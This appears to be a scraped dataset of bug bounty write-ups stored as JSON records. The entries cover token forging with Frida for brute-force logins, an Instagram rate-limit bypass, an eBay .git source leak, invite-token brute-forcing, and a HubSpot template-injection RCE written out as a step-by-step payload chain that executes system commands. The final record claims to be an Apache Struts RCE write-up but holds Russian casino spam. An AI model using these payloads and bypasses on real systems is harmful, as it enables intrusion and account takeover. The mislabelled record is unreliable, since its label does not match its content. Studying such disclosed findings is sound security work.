was like a. WOW!! … yes, it could works !! Me after a revelation of God FRIDA to the rescue This is an awesome tool, according to the website is: it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API. What is my plan from now? In theory, according to the definition, I could inject snippets of JavaScript into the native apps in this case Java. So I need to find in the code where the SEC class is used and try to understand how the token is generated (reading Java code, not assembler) and maybe generate my own token. My steps: G ive me six hours to chop down a tree and I will spend the first four sharpening the ax. Abraham Lincoln Before diving into the code I spent a couple of hours understanding the FRIDA API. This is a very important step because it allows to me get a better idea of how FRIDA works and the limitations it has. After a while, I felt confident. I opened the APK file again, read some classes, and found what I was looking for … YES !! Press enter or click to view image in full size Figure 7. create a client example class Again, the lack of code obfuscation makes me work easily. In the newBuilder.addHeader() instruction we can see how the X-ACME-Token Header is added and how Sec.access is called. According to the code, three parameters are needed, the first is a Context object, the second is a unique ID, and the last one is an URL. At this point, we can use FRIDA. The POC FRIDA uses python code to enable frida-tools, in this article I explain how is the installation of frida-tools. So I create a basic skeleton of code in python. Figure 8. Python wrapper code The next step is to create a JavaScript snippet. Press enter or click to view image in full size Figure 9. Example of JavaScript snippet There is a lot of more code in Figure 9 to show, however, I am interested in to show you the function used to generate the token. In this code we hook to the Environment class and create a new instance of it, call the setter method, and define a new value using a random string. The next part is the getValidToken function. Press enter or click to view image in full size Figure 10. getValidToken() method In this code, we overload the token function of com.acme.account.Sec. With this function overloaded we can create our acmeID and pass as an argument to the function which generates the token. Press enter or click to view image in full size Figure 11. Token generation Yeah, it worked … in Figure 11 you can see a list of token generated with FRIDA. I configure Burpsuite Intruder with my list of tokens and then I tried to brute force a valid user of ACME… Press enter or click to view image in full size Figure 12. Burpsuite intruder Oh no!!!!! After 54 requests the server return code 500 (which means server error) the status code 400 is for an invalid password but after a series of request the server detect my brute force attack… Nooooo!!! :( The exploit I never give up, so, after resting, I came to the battle again and found this… Press enter or click to view image in full size Figure 13. Context information The Context … if I remember one of the parameters of the token.access function is a Context object , so what happens if I overload the token function again and define it with 3 strings parameters? Press enter or click to view image in full size Figure 14. Token method overload I overload the function and configure my payload with my list of the token. …come on this has to work !! Figure 15. Payload configuration And DAWN men it worked…. Yeahhhh !!! Figure 16. Brute force attack success using Intruder After 303 requests the server still returns 400 code indicating that the password is invalid… Yeah !!!! What happened here? With FRIDA, we overload the function of Token. access so at run-time when I executed my python script which inside uses my JavaScript snippets and lunch an instance of com.acme.app in my emulated android device, the method definition is overloaded, so when I called the method getValidToken(), I am not calling the default method (token), I am calling the overloaded method passing 3 strings as arguments, so I don’t need to pass a context object. I have control of the three arguments and can pass random values to the token function. I use these valid tokens to launch the attack…basically in the backend each request appears valid and the server doesn’t detect my brute force attack. Yeah !!!! …But how we can fix this? The “solution” I found a better way around token-based implementation to prevent brute force attacks using SafetyNET reCAPTCHA API. Figure 17 is a detailed definition. Press enter or click to view image in full size Figure 17. SafetyNET definition This is a basic diagram of how SafetyNET reCAPTCHA does work. In Figure 18 you can see 3 actors (Android app, SafetyNET, and Android Server). The Android app has a Site Key (something like a Public key) which is used to communicate with the SafetyNET server. Then SafetyNET server returns the captcha challenge to the user and then sends the token to the server for validation. The server has the secret key and validates the token against SafetyNET, then SafetyNET server validates this token using its own analyst engine. The response is sent to the server and the server handles the token depending if it is valid or invalid. Press enter or click to view image in full size Figure 18. SafetyNET basic architecture What about ACME ? At the end of this journey, I made my report including a detailed explanation about the vulnerability and how to fix it. Of course, adding SafetyNET to an application in production is not a trivial step, requires planning and in some case, it needs to validate against product team because adding a CAPTCHA affect the user experience using the application. I didn’t exploit any vulnerability like Buffer Overflow, CSRF, SSRF, or something similar, in this case, the vulnerability is the token implementation by itself. Some times you need to spend time in order to understand the application to find this kind of bugs. Please let me know how if you implement SafetyNET reCAPTCHA API and how was the experience. Bye-bye … API Token Penetration Testing Hacking Bug Bounty -- -- Written by INMUNE7 117 followers · 31 following INMUNE7 is a group of freelance hackers which offers classic black-box penetration test and white-box tests and source code audit on Web application and mobile. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@addictrao20/fixed-brute-force-instagram-accounts-passwords-938471b6e9d4", "title": "Fixed : Brute-force Instagram account’s passwords | by Sameer Rao | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@addictrao20/fixed-brute-force-instagram-accounts-passwords-938471b6e9d4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFixed : Brute-force Instagram account’s passwords | by Sameer Rao | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Fixed : Brute-force Instagram account’s passwords Sameer Rao 2 min read · Mar 5, 2019 -- Listen Share Description : We can add an Instagram account to a Facebook Page having a role on the page as an admin or editor. Adding an Instagram account to Facebook Page will allow us to create Instagram ads in Ads Manager without needing to connect to the Instagram account to a Business Manager. There is an endpoint to connect Instagram account through the mobile browser or “mbasic.facebook.com” POST /Redacted HTTP/1.1 Host: mbasic.facebook.com fb_dtsg: — sanitized — jazoest: — sanitized — username: VICTIM_INSTAGRAM_USERNAME password: VICTIM_INSTAGRAM_PASSWORD page_id: ATTACKER_PAGE_ID Login Security: Facebook uses a rate-limiting mechanism to protect the login request from being password guesses. I could attempt only max 20 wrong passwords in a day. If I exceed 20 attempts, it fired “too many requests.” and then a further request will be blocked. What was Bug here? At the endpoint, Facebook failed to block attempts over Victim Account on the server side. The limit was 20 requests “each Facebook Account.” Bypassing a Rate Limiting: 1 Facebook Account = 20 wrong password attempts were possible at a time. 10 Facebook Accounts = 200wrong password attempts. At this point, I didn’t have a million user account’s to try out more attempts. According to Facebook, we also can create a test account for Facebook applications. [ref- https://developers.facebook.com/docs/apps/test-users/ ] Each Facebook application can create 2000Test Accounts ( like one we can create using “/whitehat/accounts/”) I created around 15 Facebook Apps. 15 apps x 2000 Test Accounts = 30,000 Test Users in a Single Facebook User Account. I created 10 Regular Facebook User Accounts. That mean, 10x30,000 = 300,000Test users So Finally, I could attempt 6,000,000 passwords daily. Timeline Sep 21, 2018 — Report Sent Sep 25, 2018 — Clarification requested by Facebook Sep 26, 2018 — Clarification sent Oct 3, 2018 -Triaged Oct 3, 2018 — Closed as Informative( Impact is minimal ) Oct 4, 2018 -More details sent. Oct 8,2018 — Triaged Oct 26, 2018 — Ask for updates. Nov 8,2018 — Fixed. Nov 14,2018 — Bounty Awarded. Facebook Bug Bounty White Hat Hacker Instagram -- -- Written by Sameer Rao 60 followers · 1 following Security Researcher No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@sampanna/rce-in-nokia-com-59b308e4e882", "title": "RCE in nokia.com. As I explained in my previous post I… | by Sampanna Chimoriya | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sampanna/rce-in-nokia-com-59b308e4e882. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE in nokia.com. As I explained in my previous post I… | by Sampanna Chimoriya | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in RCE in nokia.com Sampanna Chimoriya 2 min read · Dec 27, 2018 -- Listen Share As I explained in my previous post I like to find and read various bug bounty so I love Pentester Land . So, I was just browsing through bug bounty writeup and found a report on nokia. I didn’t know Nokia also had bug bounty so I decided give it a try. I like to use https://yandex.com to search for subdomains before using https://google.com or https://duckduckgo.com because I think yandex provides more exotic subdomains than google or duckduckgo for a bug bounty hunter. So, I decided to use yandex to search for subdomain using site operator. After some scrolling I discovered http://emop.ext.net.nokia.com . It had a login prompt and looked really old so I thought maybe there are some vulnerabilites here. I like to use nikto to discover vulnerabilites for such websites. So I always use https://suip.biz/?act=nikto to scan for vulnerabilites using nikto. I absolutely love https://suip.biz because there are various tools like nikto, whatweb, sqlmap which can be used online thanks to https://suip.biz. I decided to use nikto and whatweb on nokia subdomain and found that it was a Drupal site. I immediately decided to check the version of Drupal and turns out it was vulnerable to various vulnerabilites like Drupalgeddon. So, I decided to send report to security-alert@nokia.com and I received a message in two weeks to ask for my name to be featured in hall of fame . So, I decided to visit Nokia white hat page and it turned out it updates it’s page based on month. So, I will probably be featured in hall of fame after the end of this month. The things I would like for you take away from this post are described below. Always, always read bug bounty writeups and completely stalk a researcher you love in every social media you can find on him/her to find every tips and knowledge s/he would provide. Use suip.biz because it provides great tools and as it’s completely free so more people should find and use it. Use Yandex before Google or DuckDuckGo because in my opinion it provides subdomains which can be more vulnerable and useful for bug bounty hunter. If you read more bug bounty then just like I automatically decided to check this subdomains you will understand which subdomain might be more vulnerable and which should be tested more than other subdomains. You will automatically decide to check for CSRF or IDOR after browsing a page because it would give you a feeling that it might be vulnerable to it and you would be more right about it than wrong. Security Bug Bounty Bugs Bugsbounty Hacking -- -- Written by Sampanna Chimoriya 60 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://slashcrypto.org/2018/11/28/eBay-source-code-leak/", "title": "Pwning eBay - How I Dumped eBay Japan's Website Source Code - slashcrypto's page", "friendly_explanation": "This is a bug bounty writeup from https://slashcrypto.org/2018/11/28/eBay-source-code-leak/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPwning eBay - How I Dumped eBay Japan's Website Source Code - slashcrypto's page slashcrypto's page Home About Writings Consulting Impressum â¹ âº 28 Nov 2018 Pwning eBay - How I Dumped eBay Japan's Website Source Code Today I wanna write about a finding I discovered during a research project where the aim was to find critical vulnerabilities in Alexa Top 1 Million websites. The main focus was to discover common configuration issues which do not require sophisticated exploits, which are easy to find and which can have a high impact on businesses. Some results of this research were presented at ITSECX 2018 , an Austrian IT-Security conference. The slides of my talk can be found here . TL; DR I found out, that www.ebay.co.jp runs a version control repository on their production site which was not properly secured. This gave me access to the .git folder in the webroot directory which further allowed me to download the entire source code of www.ebay.co.jp including database passwords and much more. The initial research for this topic was performed back in 2015 by internetwache.org - their blog post about their findings can be found here and I highly recommend to read it! Dumping eBay’s Source Code I used the GitTools published by internetwache.org which can be found here . I ran this script through millions of Alexa Top 1 Million subdomains. When checking the results, eBay Japan popped up. In order to initially verify the bug, I accessed www.ebay.co.jp/.git/HEAD and the following came up: eBay leaks git repo This was a strong indicator, that the website is actually vulnerable. Due to the fact that eBay runs a bug bounty program and www.ebay.co.jp is in scope, I dumped their source code using the GitTools scripts. While waiting for the download to finish I reported the issue to eBay. I was able to download about 700 MB of compressed data. After extracting, I got 1.2 GB of data to go through. The data-set contained: Wordpress configuration files (yes, they use Wordpress) including hashed user credentials for the backend login Database passwords for production databases Log files A lot of PHP source code (who could have guessed?!) much more … Ebay was very responsive and fixed the issue about 10-12 hours after I reported it. Sadly, they have no cash rewards for valid bugs but I got added to their Hall of Fame . Update 29.11.2018 - eBay employees donated $500 to charity Source Thanks for reading and if you want to contact me, feel free to use the contact details provided here . Home About Writings Consulting Impressum This work is licensed under a Creative Commons Attribution 4.0 International License . In other words, share generously but provide attribution."}
{"source_url": "https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html", "title": "RCE in Hubspot with EL injection in HubL", "friendly_explanation": "This is a bug bounty writeup from https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE in Hubspot with EL injection in HubL Skip to main content { Better } Hacker \"I don't believe you have to be better than everybody else. I believe you have to be better than you ever thought you could be.\" Search Search This Blog Pages Home About {ME} Projects More… RCE in Hubspot with EL injection in HubL December 07, 2018 This is the story of how I was able to get remote code execution on Hubspot 's servers by exploiting a vulnerability in HubL expression language , which is used for creating templates and custom modules within the Hubspot CRM. I had absolutely no experience with these kinds of vulnerabilities before and it turned out to be a very interesting learning opportunity. In this post, I go through the process I followed while researching and how little pieces were connected together to achieve a much bigger goal. Getting started While working on the Hubspot's bugbounty program, I came across a functionality which looked very interesting. Users can create custom designs for emails or blogs from the design manager and can use HubL expression language in their templates. Because HubL is a markup language, I began with the payload {{7*7}} and got a nice '49' back which means the server was treating anything within two curly brackets as HubL code. Bear in mind, at this point I didn't know anything about expression languages or HubL so I decided to fuzz the input and see what template engine is being used at server side by following the method posted at PortSwigger blog Interestingly the output didn't follow any known pattern and I reached \"Unknown\" or \"Not Vulnerable\". Giving up after a few tries is lame, so I decided it was time to RTFM ! HubL Intro: This is a very high level intro to HubL expression language and I am by no means an expert. The following section contains just enough information to understand what was happening and how I exploited the bug. The following 3 types of delimiters are used to separate HubL and HTML within the module's code. {% %} - statement delimiters HubL statements are used to create editable modules, define conditional template logic, set up for loops, define variables, and more. {{ }} - expression delimiters Anything between expression delimiters {{ }} will be evaluated by the templating engine, and thats what I was more interested in. {# #} - comment delimiters Anything between the {# #} will be commented out or ignored by the parser. Variables: There are some built in variables such as {{ account }}, {{ company_domain }}, {{ content }} etc which can be used within a module. The parser replaces these variables with their actual values at runtime. e.g. {{ company_domain }} will be replaced by Your Company's domain name. Users can also declare custom variables within statement {% %} blocks and these can be used within expression {{ }} blocks just like built-in variables. Another interesting thing to note here is that the documentation says HubL is based on Jinja but as observed before, the output wasn't following normal Jinja pattern when evaluating the expressions. Let the hacking begin! For all below examples, the payload was submitted in template_source parameter in the POST request and its output was seen in output_html & html fields. After trying most of the built in variable names, I stumbled upon an undocumented variable: \"request\" which returned an interesting string. Payload : {{ request }} Output: com.hubspot.content.hubl.context.TemplateContextRequest@23548206 Nice! This looks like the memory location of the 'request' object! And it also looked like Java from the naming convention. After some Google searches, I tried the following payloads to verify if its a Java based template engine: Convert a string to upper case - Payload: {{'a'.toUpperCase()}} Output: A Concatenate two characters - Payload: {{'a'.concat('b')}} Output: ab Awesome! This looked very promising. The template engine not only parses its own syntax, it also allows us to call built-in methods. The Vulnerability Trying to get the class of a character - Payload: {{'a'.getClass()}} Output: java.lang.String Excellent! Java is confirmed! The vulnerability here is that it was possible to call the getClass() method on any object. At this point I was sure this could be exploited to something bigger. But before shooting for the moon, I wanted to understand how expression language works so I started by gathering more information: Get class of the request object - Payload: {{request.getClass()}} Output: class com.hubspot.content.hubl.context.TemplateContextRequest Get declared methods of a class ( increment from 0 to any number to get all the methods) - Payload: {{request.getClass().getDeclaredMethods()[0]}} Output: public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug() At this point, I searched for \" com.hubspot.content.hubl.context.TemplateContextRequest\" and discovered the Jinjava project on Github . Looking at the class declaration in the source, I was also able to call methods from the request class - Payload: {{request.isDebug()}} Output: false To take it a step further, I learnt that you can use the forName() and newInstance() methods to get an instance of a completely different class - Using string 'a' to get an instance of class sun.misc.Launcher - Payload: {{'a'.getClass().forName('sun.misc.Launcher').newInstance()}} Output: sun.misc.Launcher@715537d4 It is also possible to get a new object of the Jinjava class - Payload: {{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}} Output: com.hubspot.jinjava.JinjavaConfig@78a56797 It was also possible to call methods on the created object by combining the {% %} and {{ }} blocks - Payload: {% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}{{ji.render('{{1*2}}')}} Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}. Output: 2 Jinjava Inception! I now had enough understanding and was ready to get the coveted remote code execution. From what I'd read, that should be easy. Just create an object of java.lang.Runtime class and call the exec() method on it. So.... Payload: {{'a'.getClass().forName('java.lang.Runtime').newInstance()}} Output: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.Runtime with modifiers \"private\" Bummer! Looks like Runtime is blocked. To make sure I am not missing anything, I tried getting the declared methods of the Runtime class with getDeclaredMethods call and it worked fine, meaning that calling the newInstance() method on java.lang.Runtime class was not allowed. Knowing Java's history, I was pretty sure there will be another way. Time to find an alternative. First option: java.lang.System Payload: {{'a'.getClass().forName('java.lang.System').newInstance()}} Ouput: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.System with modifiers \"private\" Arrggh... one more candidate lost. After frantic searches and asking around, I found this gem of a blog which introduced to me to javax.script.ScriptEngineManager. Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()}} Output: javax.script.ScriptEngineManager@727c1a89 Amazing! So I got an object of ScriptEngineManager means RCE was on the horizon. But before that, I had to get to know my new friend ScriptEngineManager . Find out what type javascript engine this is - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript')}} Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a A bounty writeup without a meme is not fun! Get the script context - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').getContext()}} Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a Get language name - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageName()}} Output: ECMAScript Get language version - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageVersion()}} Output: ECMA - 262 Edition 5.1 Now go for the kill. To get RCE using the ScriptEngineManager, you have to run the ever so useful \"eval\" method with some Java code thrown into it. After a lot of trial and errors, I finally got eval to work. Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}} Output: xxx I successfully evaluated dynamic java code using ScriptEngineManager instance! Now I only need to substitute real code that will execute system commands and throw it into eval. After another trial and error session, I finally had some success - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}} Output: java.lang.UNIXProcess@1e5f456e Woot! The output was a reference to a UNIXProcess object which means my command was successfully executed! I could have now ran a reverse shell command and obtained a shell but since I was able to see the output, I decided to push this a little more and get the command's output in response itself. Another frantic search session resulted with the discovery of org.apache.commons.io.IOUtils . This class provides static utility methods for input/output operations. My final payload was - {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} Output: See for yourselves! Bingpot! It took me a few more tries to learn how to pass multiple arguments to the commands. Notice the x.command function! - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\\n As you can imagine, it was quite a struggle but in the end I had a lot of fun and learnt a lot in the process. The Jinjava project was introduced by Hubspot back in 2014 , that means this bug had been around 4 years in nobody found it (hopefully). The Hubspot team was very receptive and fixed it very fast by disabling the \"getClass\" method on a variable. You can find the fix here . Bonus A couple of days after fixing the vulnerability, Hubspot informed me that since \" Jinjava \" - an open source project - is being used by many other companies apart from Hubspot, they have applied for a CVE and I will be credited in it for the discovery of this issue! Sweet! References: 1. https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html 2. https://portswigger.net/blog/server-side-template-injection 3. http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/ 4. https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html Share Get link Facebook X Pinterest Email Other Apps Labels bugbounty EL injection rce Labels: bugbounty EL injection rce Share Get link Facebook X Pinterest Email Other Apps Comments Post a Comment Powered by Blogger Copyright © 2020, Aditya Gujar. All rights reserved"}
{"source_url": "https://medium.com/bugbountywriteup/token-brute-force-to-account-take-over-to-privilege-escalation-to-organization-take-over-650d14c7ce7f", "title": "Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over | by Plenum | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/token-brute-force-to-account-take-over-to-privilege-escalation-to-organization-take-over-650d14c7ce7f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nToken Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over | by Plenum | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over Plenum 3 min read · Dec 10, 2018 -- Listen Share Press enter or click to view image in full size TL;DR , Not all web vulnerabilities are a result of a technical issue, functional bugs can have critical business impact. Here is the story of how chaining simple issues and poor design flaws can result in account take over, privilege escalation and ultimately organization take-over. While working on a private program i was testing a product on redacted.com which is basically an app to view and manage all business data collected from several apps in one place (just imagine how much valuable data is in there). Companies are able to create a work space or organization within this app, an admin would then invite users to join. I often start with testing the invite functionality as it often result in critical issues. There are only two possible roles either user or admin, at first the invite flow seemed solid CSRF protection was in place CORS were configured properly it seemed like nothing was there and everything worked fine until, i found the first issue, there was a huge problem with the invite system, if an admin invites an external user the invitation link looked like this https://login.redacted.com/accounts/?service=product&digest=saaOBeXStZDRqgVlSRPAgPSY0 Pretty solid right? Next I tried to invite a user that has an existing account on redacted.com and as it turns out the resulting invitation was quite different the link looked like this https://product.redacted.com/invitations?inviteId=160000002637191&type=accept&source=mail No signature no hash nothing!!! Wait WHAAAAAAT!!!!! You can see where this is going. First, let me putin on my special glasses before we dive in. With further inspection i came to a conclusion that the first 12 digits refers to the organization and the last 3 are the invitation id in this case 160000002637 is the organization id while 191 is the invitation id. That is easily brute-forceable. With some more tests i figured that not only this id is bruteforceable it didn’t expire if another person used it so if admin sends invitation to X email but attacker bruteforce the token he could join the organization with email Y, Z and N emails the invite would sill be valid until email X is used. It meant that an attacker can bruteforce token infiltrate organization and the admin would still see invitation as pending, cool ha! So to summarize this part here is the scenario Admin of org sends invitation to User A with email X Attacker bruteforce invitation ID Attacker signup with email Y Attacker is inside org Admin will see that the invitation is still pending You would think OK how this would result in an organization takeover or privilege escalation, the app had also another issue, a user can view pending invitations and their roles once he finds an admin invitation he could exploit it and takeover the hole thing using the disclosed email address. In other words this would drastically decrease bruteforce attack, once he found a single valid token he would stop bruteforcing join the organization if the invite was for an admin then he hit a jackpot if the invite was for a user he would simply keep checking the pending invites section until he finds an admin invite, given the fact that an org can have large number of users, there is a great chance he would remain unnoticed. As a bounty hunter you should look into functional bugs too as these bugs can result in a critical business impact. Till next time, Happy hunting everyone, Plenum Infosec Bug Bounty Information Security -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Plenum 342 followers · 3 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2019/04/apache-strust-rce.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/04/apache-strust-rce.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в 